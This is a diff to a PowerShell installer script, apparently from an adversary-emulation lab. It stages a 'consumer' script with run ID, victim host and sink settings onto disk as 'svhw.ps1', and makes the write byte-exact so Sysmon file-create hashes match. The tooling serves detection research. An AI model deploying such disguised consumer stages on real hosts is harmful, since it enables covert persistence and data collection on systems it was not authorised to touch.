@@ -15,13 +15,17 @@ $ConsumerName = "SystemDumpConsumer"
 # --- materialize consumer with run-scoped config ------------------------------
 $source = Join-Path $PSScriptRoot "consumer.ps1"
 if (-not (Test-Path $source)) { Write-Host "[S3] missing consumer.ps1 next to installer"; exit 1 }
-$body = Get-Content -Path $source -Raw -Encoding UTF8
+# byte-fidelity read/write (no BOM, no line-ending conversion) so the on-disk
+# svhw.ps1 is byte-identical to the staged consumer and the EID 11 hash of the write
+# event equals the staged artifact hash (module-integrity link).
+$body = [System.IO.File]::ReadAllText($source, [System.Text.Encoding]::UTF8)
 $body = $body.Replace("__RUN_ID__", $RunId).Replace("__SINK_BASE__", $SinkBase).Replace("__HOST__", $VictimHost)
-Set-Content -Path $ConsumerPath -Encoding UTF8 -Value $body
+[System.IO.File]::WriteAllText($ConsumerPath, $body,
+    (New-Object System.Text.UTF8Encoding($false)))
 if (-not (Test-Path $ConsumerPath)) { Write-Host "[S3] consumer write failed"; exit 1 }
 
 # config-carry-over verification (run id inside the artifact, not just the path)
-$written = Get-Content -Path $ConsumerPath -Raw -Encoding UTF8
+$written = [System.IO.File]::ReadAllText($ConsumerPath, [System.Text.Encoding]::UTF8)
 if (-not $written.Contains($RunId)) { Write-Host "[S3] run id missing in written consumer"; exit 1 }
 Write-Host "[S3] consumer materialized: $ConsumerPath (run $RunId)"
 
